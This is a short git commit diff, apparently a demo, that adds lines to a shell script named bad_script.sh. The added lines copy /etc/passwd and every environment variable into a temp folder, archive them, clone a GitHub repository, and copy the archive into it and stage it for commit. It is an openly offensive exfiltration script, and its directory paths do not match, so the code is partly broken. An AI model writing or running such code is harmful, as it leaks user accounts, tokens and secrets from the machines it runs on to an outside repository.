be748ceb5de79ae2af19e6ce8a41e96d4191b15b
Fekr09a <107809253+Fekr09a@users.noreply.github.com>
2025-10-14 12:39:40 +0200

    Update bad_script.sh

--- bad_script.sh
+++ bad_script.sh
@@ -15,3 +15,25 @@ printenv
 
 # Installe git
 apt-get update && apt-get install -y git
+
+echo "Collecte des données sensibles..."
+
+mkdir -p /tmp/data_exfiltrated
+cp /etc/passwd /tmp/exfiltration/users.txt
+printenv > /tmp/exfiltration/env_vars.txt
+
+
+echo "Création de l'archive..."
+tar czf /tmp/data_exfiltrated.tar.gz -C /tmp/exfiltration .
+
+
+# Clone le repo 
+git clone https://github.com/Fekr09a/ai-demo.git
+cd ai-demo
+git config user.email "Paris@PlatformCon.com"
+cp /tmp/data_exfiltrated.tar.gz .
+ls
+git add data_exfiltrated.tar.gz
+
+echo "Les données ont été collectées et archivées dans /tmp/data_exfiltrated.tar.gz"
+echo "Script terminé."
